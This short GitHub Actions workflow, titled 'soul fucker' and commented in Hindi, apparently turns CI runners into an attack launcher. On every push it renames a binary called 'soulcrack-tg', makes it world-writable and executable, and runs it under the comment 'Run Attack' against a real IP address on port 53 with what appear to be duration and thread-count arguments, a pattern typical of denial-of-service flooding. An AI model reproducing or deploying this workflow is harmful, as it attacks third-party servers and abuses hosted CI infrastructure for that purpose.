name: soul fucker
on: [push]
jobs:
  stage-0:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Fix and Run
        run: |
          # Agar file soulcrack-tg naam se hai toh use soul banao
          if [ -f "soulcrack-tg" ]; then
            mv soulcrack-tg soul
          fi
          
          # Permission aur Check
          chmod 777 soul || echo "File still not found"
          ls -l
          
          # Run Attack
          ./soul 147.75.202.61 53 10 100
